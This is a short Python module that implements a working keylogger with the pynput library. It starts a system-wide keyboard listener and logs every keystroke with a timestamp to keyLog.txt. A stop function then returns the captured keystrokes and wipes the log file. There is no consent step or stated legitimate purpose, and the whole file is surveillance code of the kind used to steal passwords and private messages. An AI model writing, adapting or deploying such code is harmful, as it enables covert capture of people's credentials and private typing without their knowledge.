from turtle import listen
import pynput.keyboard
from pynput.keyboard import Listener
import pynput.keyboard as KeyBoard
import logging
from multiprocessing import Process
import threading
logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
  logging.info(str(key))

def StartLogging():
    listener = Listener(on_press = on_press)
    listener.start()
    return listener

def EndLogging(listener):
    listener.stop()
    listener = None
    res = ""
    with open('keyLog.txt', 'r') as f:
        cont = f.readlines()
        for line in cont:
            res = res + line + '\n'
        f.close()
    f = open('keyLog.txt', 'w')
    f.truncate(0)
    f.close()
    return res
    
